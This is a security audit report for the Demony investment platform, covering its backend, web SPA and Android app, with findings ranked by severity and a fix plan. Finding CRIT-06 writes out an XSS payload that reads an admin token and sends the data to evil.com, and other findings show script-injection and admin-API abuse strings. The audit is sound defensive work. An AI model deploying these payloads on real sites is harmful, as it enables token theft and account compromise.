# DEMONY PLATFORM — DEEP AUDIT REPORT

**Date:** February 17, 2026  
**Scope:** Backend (Node.js/Express/MongoDB), Web App (Vanilla JS SPA), Android App (Kotlin/Compose)  
**Approach:** Senior developer code review covering bugs, security, performance, architecture, mobile UX, and scalability

---

## EXECUTIVE SUMMARY

| Severity | Count |
|----------|-------|
| **Critical** | 14 |
| **High** | 23 |
| **Medium** | 31 |
| **Low** | 18 |
| **Total** | 86 |

The platform has a solid foundation but carries **critical financial security risks** (double-spend vectors, missing transaction integrity), **XSS vulnerabilities** in the web app, and **compliance/legal gaps** in the Android app. The backend uses MongoDB transactions correctly in some places but inconsistently. The web frontend has no CSP and exposes admin functions on `window`. The Android app has no certificate pinning, uses `Double` for currency, and hardcodes risk acknowledgments.

---

## PART 1: BACKEND AUDIT

### Architecture Overview
- **Pattern:** Express.js monolith, direct MongoDB driver, no ORM
- **Entry Point:** `packages/backend/src/server.js`
- **Core Modules:** routes/ (13 files), middleware/ (3 files), services/ (2 files), config/ (1 file)
- **Database:** MongoDB with custom query helper and raw driver calls
- **Data Flow:** Client → Express → Route handler → MongoDB → Response
- **External Services:** Paystack (payments), Brevo (email)

---

### CRITICAL Issues

#### CRIT-01: Auth Middleware Allows Requests When DB Is Down
**File:** `packages/backend/src/middleware/auth.js` (line 38-41)  
**What's Wrong:** When the database is unreachable, the catch block logs the error but allows the request through ("graceful degradation"). This means a DB outage **disables authentication entirely** — any request with a validly-signed JWT (even for a suspended/deleted user) passes through.  
**Attack Scenario:** Attacker gets a valid JWT, then waits for or causes a DB outage. All requests bypass account status checks.  
**Fix:** Return 503 on DB failure instead of allowing the request through:
```javascript
} catch (dbErr) {
  console.error('Auth middleware DB check failed:', dbErr.message);
  return res.status(503).json({ error: 'Service temporarily unavailable' });
}
```
**Reference:** CWE-287 (Improper Authentication)

#### CRIT-02: Wallet Credit Race Condition on Deposit Verify + Webhook
**File:** `packages/backend/src/routes/wallet.js` (line 195-220) + `walletWebhook.js` (line 55-75)  
**What's Wrong:** Both the `/deposit/verify/:reference` endpoint AND the Paystack webhook can credit the wallet. Both use `status: 'pending'` as a guard, but the user-initiated verify runs outside a transaction and doesn't lock the row. If the webhook fires at the exact same moment the user hits verify, both can read `status: 'pending'` and both credit the wallet.  
**Impact:** User gets credited **twice** for a single payment.  
**Fix:** Use a MongoDB transaction with a unique idempotency key, or use `findOneAndUpdate` with `returnDocument: 'after'` to make the check-and-update truly atomic. Better yet, remove the user-facing verify endpoint and rely solely on the webhook.  
**Reference:** CWE-362 (Race Condition)

#### CRIT-03: Withdrawal Not Transactional
**File:** `packages/backend/src/routes/wallet.js` (line 300-410)  
**What's Wrong:** The wallet withdrawal flow (1) atomically deducts balance, (2) inserts into `withdrawals`, (3) inserts into `transactions` — but steps 2 and 3 are NOT in a transaction. If step 2 succeeds but step 3 fails, the money is deducted and the withdrawal is recorded, but there's no transaction audit trail. If step 2 fails, the deduction is already committed — money disappears.  
**Fix:** Wrap the entire withdrawal in a `session.withTransaction()` like the investment flow does.

#### CRIT-04: JWT Token Expiry Too Long (7 Days), No Refresh Token
**File:** `packages/backend/src/routes/auth.js` (line 397, 219)  
**What's Wrong:** Tokens expire after 7 days with no refresh mechanism. If a token is stolen, the attacker has a week of access. Combined with in-memory token versioning (no persistent blacklist), a compromised token cannot be revoked until the user changes their password.  
**Fix:** Reduce JWT expiry to 15-30 minutes, implement a refresh token flow with httpOnly cookies, and store a token blacklist in the DB.  
**Reference:** OWASP Session Management

#### CRIT-05: No CSRF Protection
**What's Wrong:** The API uses `credentials: true` CORS but has no CSRF tokens. Any malicious website a logged-in user visits can make cross-origin requests on their behalf (deposit, withdraw, invest) if they can bypass CORS.  
**Fix:** Implement CSRF tokens or use SameSite cookies for auth instead of localStorage.

---

### HIGH Issues

#### HIGH-01: In-Memory Rate Limiting and Brute Force Protection
**Files:** `middleware/rateLimiter.js`, `routes/auth.js` (lines 14-55)  
**What's Wrong:** Rate limiting and login attempts are stored in-memory JavaScript objects. On a multi-instance deployment (e.g., Render auto-scaling), each instance has its own store. Attacker can bypass limits by hitting different instances. On restart, all limits reset.  
**Fix:** Use Redis for rate-limit counters, or at minimum MongoDB with TTL indexes.

#### HIGH-02: Password Reset Flow — No Proper Reset Endpoint
**File:** `routes/auth.js` (full file search)  
**What's Wrong:** There is NO password reset/forgot-password endpoint. Users who forget their password have no way to recover their account without contacting support manually.  
**Fix:** Implement a standard forgot-password flow: (1) POST /auth/forgot-password sends a time-limited token via email, (2) POST /auth/reset-password validates token and sets new password.

#### HIGH-03: Ownership Percentage Calculation Bug
**File:** `routes/investments.js` (line 89-90)  
**What's Wrong:** `ownershipPercent = (amount / totalFunding) * 100` where `totalFunding` includes the current investment. This means the FIRST investor in a project always gets 100% ownership. Subsequent investments dilute ALL previous investors proportionally, but the stored `ownershipPercent` on previous investments is NEVER updated. The data becomes stale immediately.  
**Fix:** Either (a) recalculate all ownership percentages atomically when a new investment is added, or (b) calculate ownership at query time as `myInvestment / totalProjectFunding * 100` and don't store it.

#### HIGH-04: Email Template XSS
**File:** `services/email.js` (throughout templates)  
**What's Wrong:** While `sanitizeData()` exists, the templates use template literals with `${data.name}`, `${data.verifyUrl}`, etc. If `sanitizeData` is not called before every template render (and checking shows it IS called), there's still a risk if new templates are added without sanitization. The `verifyUrl` contains a user-controlled token that gets embedded in HTML — should be URL-encoded.  
**Fix:** Ensure ALL template data goes through `sanitizeData()` consistently. URL-encode any URLs with user-controlled segments.

#### HIGH-05: Admin Panel — No Operation Audit Log
**File:** `routes/admin.js` (full file)  
**What's Wrong:** Admin operations (approve withdrawal, credit wallet, distribute profit, suspend user, verify KYC) have NO audit trail. If an admin makes a mistake or acts maliciously, there's no record of who did what and when.  
**Fix:** Log every admin action to an `admin_audit_log` collection with `adminId`, `action`, `targetId`, `details`, `timestamp`, `ipAddress`.

#### HIGH-06: `validateIdParam` Not Used Consistently
**File:** `routes/admin.js` imports `validateIdParam` but most routes use raw `req.params.id` with `new ObjectId(req.params.id)` without validation.  
**What's Wrong:** If `req.params.id` is not a valid 24-character hex string, `new ObjectId()` throws an unhandled exception, resulting in a 500 error that leaks stack trace information.  
**Fix:** Use `validateIdParam` middleware on all `:id` routes, or add a try-catch wrapper.

#### HIGH-07: Notification Service — Sequential Bulk Notifications
**File:** `services/notifications.js` (line 125-130)  
**What's Wrong:** `notifyMultipleUsers()` sends notifications in a sequential loop. For profit distribution to 1000 investors, this takes ~1000 DB round-trips.  
**Fix:** Use `insertMany()` for the DB writes, then iterate SSE connections.

#### HIGH-08: MongoDB Connection — Busy-Wait Anti-Pattern
**File:** `database/src/index.js` (line 28-31)  
**What's Wrong:** When a connection is in progress, the code uses `while (isConnecting) { await setTimeout(100); }` — a busy-wait loop that burns CPU.  
**Fix:** Use a promise/semaphore that resolves when connection completes.

#### HIGH-09: Hardcoded Profit Split Override in Frontend
**File:** `packages/web/src/js/pages/projects.js`  
**What's Wrong:** Client-side code contains `if (profitSharing.investor === 60) { profitSharing = { investor: 80, platform: 20 }; }` in two places. This silently changes the displayed profit split for all 60/40 projects, misleading investors.  
**Fix:** Remove client-side overrides. Profit split configuration should be controlled server-side only.

#### HIGH-10: No Input Length Limits on Several Endpoints
**Files:** Multiple routes  
**What's Wrong:** Fields like `accountName`, `description`, `feedback`, `message` in support tickets, project updates, etc. have no length validation. An attacker could send multi-MB strings.  
**Fix:** Add `maxlength` validation (e.g., 200 chars for names, 5000 for descriptions, 10000 for feedback).

---

### MEDIUM Issues

#### MED-01: CSP Headers Disabled
**File:** `server.js` (line 69) — `contentSecurityPolicy: false`  
Enables any script/style source. Should at minimum set `default-src 'self'`.

#### MED-02: `db.query()` Inconsistent with Direct DB Access
Both `db.query('users', 'findOne', ...)` and `database.collection('users').findOne(...)` are used throughout routes. This dual API creates confusion and inconsistency. Standardize on one approach.

#### MED-03: KYC Documents Stored as Base64 in User Document
**File:** `routes/auth.js` — KYC `idDocument` and `selfie` stored as base64 strings.  
A 5MB image as base64 is ~6.6MB — stored directly in the user document. This bloats every user query unless specifically excluded. Store in a separate collection or object storage (S3/GCS).

#### MED-04: Referral Code Generation Not Deterministic
**File:** `routes/referrals.js` (line 16-19)  
`generateReferralCode` uses `Date.now()` in the hash, so calling it twice for the same user produces different codes. The retry loop handles collisions but a user can end up with multiple codes in the DB (confirmed by the index allowing non-unique userId).

#### MED-05: Project Search Regex Without Index
**File:** `routes/admin.js` — Admin search uses `$regex` with `$options: 'i'`. MongoDB cannot use indexes efficiently for case-insensitive regex unless a text index or collation is configured. At scale, these queries will be full collection scans.

#### MED-06: No Pagination on Public Projects Endpoint
**File:** `routes/projects.js` — The public `/projects` endpoint returns all active projects. No skip/limit parameters for regular users.

#### MED-07: Graceful Shutdown Timeout — 10 Seconds May Be Too Short
**File:** `server.js` (line 240) — If active financial transactions are in flight, 10 seconds may not be enough.

#### MED-08: SSE Connections Leak Memory
**File:** `services/notifications.js` — ActiveConnections map grows without bound. If a user opens many tabs, each creates a new SSE connection. No per-user connection limit.

#### MED-09: `toObjectId` Helper Duplicated in 5+ Files
Defined identically in `wallet.js`, `walletWebhook.js`, `investments.js`, `admin.js`. Should be a shared utility.

#### MED-10: Email Verification Token Not Invalidated on New Token Generation
**File:** `routes/auth.js` (line 220, 352)  
When a user logs in unverified, it checks for an existing valid token or creates a new one. But old valid tokens are never invalidated — multiple valid tokens can exist simultaneously.

---

## PART 2: WEB APP AUDIT

### Architecture Overview
- **Pattern:** Vanilla JS SPA with hash-based routing
- **Framework:** None (plain JS, no React/Vue/Angular)
- **Styling:** 3826-line monolithic CSS file
- **Build:** Vite

---

### CRITICAL Issues

#### CRIT-06: XSS in Business Dashboard
**File:** `packages/web/src/js/pages/business.js`  
**What's Wrong:** `project.name` and `project.description` are inserted into `innerHTML` without `escapeHtml()`. A business owner could set a project name to `<img src=x onerror="fetch('/api/admin/users',{headers:{Authorization:'Bearer '+localStorage.demony_token}}).then(r=>r.json()).then(d=>fetch('https://evil.com/?data='+JSON.stringify(d)))">` and steal admin data when an admin views the project.  
**Fix:** Wrap all user-controlled data with `escapeHtml()` before inserting into innerHTML.  
**Reference:** CWE-79 (XSS)

#### CRIT-07: Admin Functions Exposed on `window` Object
**File:** `packages/web/src/js/pages/admin.js`  
**What's Wrong:** 18 admin functions are attached to `window` (e.g., `window.showCreditWalletModal`, `window.confirmDeleteUser`, `window._adminApi`). Any browser extension, injected script, or XSS payload can call `window._adminApi.request('/admin/users/USERID/credit-wallet', {method:'POST', body:{amount:999999}})`.  
**Fix:** Replace all inline `onclick` handlers with `addEventListener`. Remove `window._adminApi`. Use closures to keep the API reference private.  
**Reference:** CWE-749 (Exposed Dangerous Method)

#### CRIT-08: Auth Tokens in localStorage — No XSS Protection
**File:** `packages/web/src/js/api.js` (lines 6-7, 63-65)  
**What's Wrong:** JWT tokens are stored in `localStorage`. Combined with the XSS vulnerabilities above, any XSS attack can read `localStorage.demony_token` and exfiltrate the token.  
**Fix:** Use httpOnly cookies for session management, or at minimum fix ALL XSS vectors and add a strong CSP.

---

### HIGH Issues

#### HIGH-11: Paystack Callback Infinite Retry Loop
**File:** `packages/web/src/js/pages/wallet.js`  
**What's Wrong:** On page load, wallet.js checks URL params for `reference`. If `api.verifyDeposit(reference)` fails, the reference stays in the URL. Next navigation to wallet re-triggers verification in an infinite loop.  
**Fix:** Clear the URL parameters immediately after reading them, before calling verify.

#### HIGH-12: No Re-Authentication for Destructive Actions
**File:** `packages/web/src/js/pages/settings.js`  
**What's Wrong:** Account deletion requires only typing "DELETE" in a prompt. No password re-entry. Combined with XSS or session hijack, an attacker can delete the account.  
**Fix:** Require current password for account deletion and wallet withdrawals.

#### HIGH-13: Admin Page Loads 500 Users in Single Request
**File:** `packages/web/src/js/pages/admin.js`  
**What's Wrong:** `loadUsersTable` fetches `limit=500` users. With a growing platform, this is a performance and memory problem.  
**Fix:** Implement proper pagination with 20-50 users per page.

#### HIGH-14: `escapeHtml` Missing in Admin Project Description Textarea
**File:** `packages/web/src/js/pages/admin.js` — `showEditProjectModal`  
**What's Wrong:** Project description is placed in a `<textarea>` via innerHTML. A description containing `</textarea><script>alert(1)</script>` breaks out of the textarea element.  
**Fix:** Set `textarea.value = project.description` via DOM API instead of innerHTML.

---

### MEDIUM Issues

#### MED-11: Duplicate `showNotification` Function
**Files:** `pages/settings.js`, `pages/referrals.js`  
Same function copy-pasted. Should be in `utils.js`.

#### MED-12: Support Page Appends `<style>` on Every Render
**File:** `pages/support.js`  
Creates and appends a `<style>` element to `<head>` every time the page renders. After 10 navigations, 10 identical `<style>` tags exist.

#### MED-13: No Loading States for Several Pages
**Files:** Multiple pages  
Several pages show blank content while API calls are pending. No skeleton loaders or spinners on first load.

#### MED-14: CSS File is 3826 Lines, No Code Splitting
**File:** `packages/web/src/css/styles.css`  
Admin styles (~500+ lines) load for all users. Should be lazy-loaded or split.

#### MED-15: Analytics Scripts Block First Paint
**File:** `packages/web/src/index.html`  
Google Analytics and Facebook Pixel load synchronously in `<head>`. Should be `async` or `defer`, or loaded after first paint.

#### MED-16: Hash Router Doesn't Support Query Parameters Properly
**File:** `packages/web/src/js/router.js`  
Route matching only uses `hash.slice(1)` — doesn't parse or preserve query parameters. Hash queries like `#wallet?ref=XYZ` require custom parsing in each page.

---

### MOBILE UX AUDIT (Web)

#### MOB-01: Touch Targets Too Small in Admin Tables (**High**)
Admin table action buttons ("Approve", "Reject", "Details") are rendered as small text buttons without adequate padding. On mobile, these are easily mis-tapped.

#### MOB-02: Modal Scrolling Issues (**Medium**)
Investment modals and withdrawal forms inside modals may exceed viewport height on small screens. No scroll containment on modal body — page scrolls behind modal.

#### MOB-03: Tab Bar Has No Active State Persistence (**Medium**)
Mobile tab bar rebuilds on every `updateMobileTabBar()` call but doesn't always reflect the current page correctly during admin navigation.

#### MOB-04: Form Labels and Inputs Cramped on 320px Screens (**Medium**)
Signup form, withdrawal form, and KYC form have inputs that stack correctly but padding is insufficient at 320px width.

#### MOB-05: No Safe Area Insets (**Low**)
Missing `env(safe-area-inset-bottom)` on mobile tab bar for notched phones (iPhone X+).

---

## PART 3: ANDROID APP AUDIT

### Architecture Overview
- **Pattern:** MVVM with Hilt DI, Jetpack Compose UI, Retrofit + Gson networking
- **Entry Point:** `MainActivity.kt` → `DemonyNavHost`
- **Navigation:** Sealed class routes, no route guards
- **State Management:** StateFlow in ViewModels

---

### CRITICAL Issues

#### CRIT-09: Investment Risk Acknowledgments Hardcoded to `true`
**File:** `viewmodels/InvestmentsViewModel.kt` (line ~60)  
**What's Wrong:** The `invest()` function sends `termsAccepted = true`, `riskAcknowledged = true`, `lossAcknowledged = true`, `lockInAcknowledged = true` regardless of what the user actually checks. The checkboxes in `ProjectDetailScreen` are cosmetic — they don't gate the API call.  
**Legal/Compliance Risk:** The terms acceptance audit trail (stored in DB) records that the user accepted all terms, but they may not have. This invalidates the legal protection the acknowledgments are supposed to provide.  
**Fix:** Pass actual checkbox states from the UI through to the repository.

#### CRIT-10: Release Build Signed with Debug Key
**File:** `app/build.gradle.kts` — `signingConfig = signingConfigs.getByName("debug")`  
**What's Wrong:** Release APKs are signed with the debug keystore. Google Play Store will reject this. If distributed via side-loading, users can't verify the app's authenticity.  
**Fix:** Create a release keystore and configure it properly. Store the keystore password in environment variables or a secrets manager.

#### CRIT-11: `retryOnConnectionFailure(true)` Enables Double-Spend
**File:** `data/api/NetworkModule.kt`  
**What's Wrong:** OkHttp's retry feature will silently retry failed POST requests (deposit, investment, withdrawal) on network hiccups. If the server processed the request but the response was lost, the client retries and the server processes it again.  
**Fix:** Set `retryOnConnectionFailure(false)` and implement application-level idempotency with unique request IDs.

#### CRIT-12: No Certificate Pinning
**File:** `data/api/NetworkModule.kt`  
**What's Wrong:** For a financial app handling real money, the app should pin the server's TLS certificate to prevent MITM attacks. Without pinning, a compromised or rogue CA can issue a fake certificate and intercept all traffic.  
**Fix:** Add certificate pinning via OkHttp's `CertificatePinner` for `demony-api.onrender.com`.

#### CRIT-13: Currency Values as `Double`
**File:** `data/models/Models.kt` — All monetary fields (`walletBalance`, `amount`, `totalInvested`, etc.)  
**What's Wrong:** IEEE 754 floating-point arithmetic causes rounding errors. `0.1 + 0.2 ≠ 0.3` in binary floating-point. For a financial app, this can lead to incorrect balances.  
**Fix:** Use `BigDecimal` in models, or represent currency as integer cents (`amount_pesewas: Int`).

---

### HIGH Issues

#### HIGH-15: No Auth Route Guards — Deep Links Bypass Authentication
**File:** `ui/navigation/Navigation.kt`  
**What's Wrong:** All routes (including `wallet`, `investments`, `admin`) are declared in the nav graph regardless of auth state. A deep link like `demony://wallet` opens the wallet screen without checking authentication.  
**Fix:** Wrap authenticated routes with an auth check that redirects to login if `isAuthenticated` is false.

#### HIGH-16: `allowBackup="true"` in AndroidManifest
**File:** `AndroidManifest.xml`  
**What's Wrong:** Allows ADB backup of app data. On a rooted device, an attacker can extract the encrypted shared preferences containing the auth token.  
**Fix:** Set `android:allowBackup="false"` and `android:fullBackupContent="false"`.

#### HIGH-17: 30-Second Notification Polling Without Lifecycle Awareness
**File:** `viewmodels/NotificationsViewModel.kt`  
**What's Wrong:** Polls the server every 30 seconds using a coroutine in the ViewModel. This continues when the app is in the background, draining battery and wasting data.  
**Fix:** Use `Lifecycle`-aware coroutine scope or switch to Firebase Cloud Messaging.

#### HIGH-18: WebView JavaScript Enabled Without URL Allowlisting
**File:** `ui/screens/wallet/WalletScreen.kt`  
**What's Wrong:** Paystack deposit WebView has `javaScriptEnabled = true` and `domStorageEnabled = true` without restricting which URLs are loaded. If the Paystack URL redirects to a malicious page, it has full JS execution context.  
**Fix:** Override `shouldOverrideUrlLoading` to only allow `paystack.co` and `paystack.com` domains.

#### HIGH-19: Withdrawal Dialog Button Permanently Disabled After First Submit
**File:** `ui/screens/wallet/WalletScreen.kt`  
**What's Wrong:** `isSubmitting` state is set to `true` on submit but never reset to `false` on success or failure. The button stays disabled permanently.  
**Fix:** Reset `isSubmitting = false` in both `.onSuccess {}` and `.onFailure {}` blocks.

#### HIGH-20: Auth Interceptor Forces Content-Type on ALL Requests
**File:** `data/api/NetworkModule.kt`  
**What's Wrong:** The interceptor adds `Content-Type: application/json` to every request, including potential future file uploads or multipart requests. This would break those requests.  
**Fix:** Only set Content-Type if the request body is not null and is JSON.

#### HIGH-21: Login Error Cleared on Every Keystroke
**File:** `ui/screens/auth/LoginScreen.kt`  
**What's Wrong:** `LaunchedEffect(identifier, password) { authViewModel.clearError() }` fires on every character typed, immediately clearing any error message the user is trying to read.  
**Fix:** Only clear errors when the user starts typing AFTER an error was shown, with a debounce.

---

### MEDIUM Issues

#### MED-17: Referral Code Logic Duplicated in PortfolioViewModel
`PortfolioViewModel` and `ReferralsViewModel` both load the referral code independently, causing duplicate API calls.

#### MED-18: Missing ProGuard Rules for Gson
Without `@Keep` annotations or ProGuard rules for model classes, release builds with minification will strip `@SerializedName` annotations, breaking all API deserialization.

#### MED-19: Unused Dependencies
Room database and kotlinx-serialization-json are in `build.gradle.kts` but never used, adding ~2MB to the APK.

#### MED-20: Dead Code in LoginScreen
`TermsOfServiceDialog` and `PrivacyPolicyDialog` composables defined but never called.

#### MED-21: Share URL Domain Mismatch
`ProjectDetailScreen` generates share URLs with `https://demony.com` but deep links use `https://demony.app`. Inconsistent domains.

#### MED-22: Thread-Unsafe Pagination State in ProjectsViewModel
`currentPage`, `totalPages`, `hasMorePages` are `var` fields mutated from different coroutines without synchronization.

#### MED-23: `SimpleDateFormat` Usage — Thread-Unsafe
Multiple ViewModels use `SimpleDateFormat` which is not thread-safe. Should use `java.time` APIs or `kotlin.time`.

---

## PART 4: CROSS-PLATFORM SYSTEMIC ISSUES

### SYS-01: No Idempotency Keys for Financial Operations
**Severity:** Critical  
All financial endpoints (deposit, invest, withdraw, profit distribution) lack idempotency keys. Network retries, double-clicks, or client bugs can duplicate financial operations. The investment flow uses transactions (good), but deposit verify and withdrawal do not.

### SYS-02: Mixed `userId` Formats (String vs ObjectId)
**Severity:** High  
Throughout the codebase, `userId` is sometimes stored as a `string`, sometimes as `ObjectId`. The `buildUserIdFilter()` function (duplicated 3+ times) works around this by querying for both. This is a data integrity issue that should be standardized.

### SYS-03: No API Versioning
**Severity:** Medium  
All endpoints are under `/api/` with no version prefix. Any breaking API change will break all clients (web + mobile) simultaneously. Should be `/api/v1/`.

### SYS-04: No Centralized Error Handling / Error Codes
**Severity:** Medium  
All routes return `{ error: "human-readable string" }`. Clients parse error strings for logic (e.g., checking for "needsVerification"). Should use machine-readable error codes alongside messages.

### SYS-05: Profit Distribution Algorithm Not Transparent
**Severity:** High  
The admin can distribute arbitrary profit amounts to any project's investors. There's no algorithmic enforcement of the profit-sharing ratio (80/20 or otherwise). The admin manually inputs amounts. This creates trust issues and potential for errors.

### SYS-06: No Automated Tests
**Severity:** High  
Zero test files across all three codebases. No unit tests, integration tests, or E2E tests. For a financial platform, this is a significant risk — any code change could silently break financial logic.

---

## PART 5: PRIORITIZED FIX PLAN

### Immediate (Do This Week) — Security Critical

| # | Issue | Effort |
|---|-------|--------|
| 1 | Fix XSS in `business.js` — add `escapeHtml()` to project name/description | 15 min |
| 2 | Remove `window.*` admin function exposure in `admin.js` | 2 hours |
| 3 | Fix auth middleware to return 503 on DB failure instead of passing through | 10 min |
| 4 | Fix double-credit race condition in deposit verify + webhook | 2 hours |
| 5 | Wrap withdrawal in MongoDB transaction | 1 hour |
| 6 | Set `retryOnConnectionFailure(false)` in Android NetworkModule | 5 min |
| 7 | Pass actual risk acknowledgment checkbox states from Android UI | 1 hour |
| 8 | Set `android:allowBackup="false"` | 5 min |
| 9 | Fix withdrawal dialog `isSubmitting` state reset in Android | 15 min |
| 10 | Add certificate pinning in Android | 1 hour |

### Short-Term (This Month) — High Priority

| # | Issue | Effort |
|---|-------|--------|
| 11 | Implement password reset flow | 4 hours |
| 12 | Reduce JWT expiry + implement refresh tokens | 6 hours |
| 13 | Move rate limiting to Redis/MongoDB | 3 hours |
| 14 | Add admin audit logging | 3 hours |
| 15 | Fix ownership percentage calculation or make it dynamic | 2 hours |
| 16 | Add re-authentication for destructive actions | 2 hours |
| 17 | Fix Paystack callback infinite retry loop in web | 30 min |
| 18 | Add WebView URL allowlisting in Android | 1 hour |
| 19 | Add API versioning (`/api/v1/`) | 2 hours |
| 20 | Add idempotency keys to financial endpoints | 4 hours |
| 21 | Standardize `userId` format across all collections | 3 hours |
| 22 | Create release signing config for Android | 1 hour |

### Medium-Term (Next Quarter) — Stability & Scale

| # | Issue | Effort |
|---|-------|--------|
| 23 | Add automated tests (at minimum for financial logic) | 2 weeks |
| 24 | Replace `Double` with `BigDecimal`/integer cents in Android | 3 days |
| 25 | Implement proper CSRF protection | 1 day |
| 26 | Add CSP headers | 1 day |
| 27 | Move KYC documents to object storage | 2 days |
| 28 | Implement pagination on all list endpoints | 3 days |
| 29 | Split CSS file + lazy-load admin styles | 1 day |
| 30 | Replace 30-second polling with FCM push notifications | 1 week |
| 31 | Add structured error codes to all API responses | 2 days |
| 32 | Extract duplicated utilities (`toObjectId`, `buildUserIdFilter`, etc.) | 1 day |
| 33 | Add ProGuard rules for Gson models in Android | 2 hours |
| 34 | Remove unused dependencies (Room, kotlinx-serialization) | 30 min |
| 35 | Implement algorithmic profit distribution verification | 1 week |

---

## PART 6: POSITIVE FINDINGS

The codebase also demonstrates several good practices that should be maintained:

1. **MongoDB transactions for investments** — The investment creation flow uses `session.withTransaction()` correctly for all-or-nothing financial operations.
2. **Atomic wallet operations** — Uses `updateOne` with `$gte` guards to prevent overdraft via concurrent requests.
3. **NoSQL injection middleware** — Custom `sanitize.js` strips `$` operators from all input.
4. **Paystack webhook signature verification** — HMAC-512 verification with raw body parsing (mounted before `express.json()`).
5. **Token versioning** — Password changes increment `tokenVersion`, invalidating old tokens.
6. **Email HTML escaping** — `sanitizeData()` in the email service prevents XSS in email templates.
7. **Graceful shutdown** — signal handlers for SIGTERM/SIGINT close the server and DB connection.
8. **Database indexes** — Comprehensive index creation script covering all major query patterns.
9. **Brute force protection** — Login attempts are tracked with lockout after 5 failures.
10. **Input validation** — Password strength, phone format, email format, and amount range validation on most endpoints.

---

*End of audit report. This document should be used as a living checklist — mark items as resolved when fixed and re-audit quarterly.*
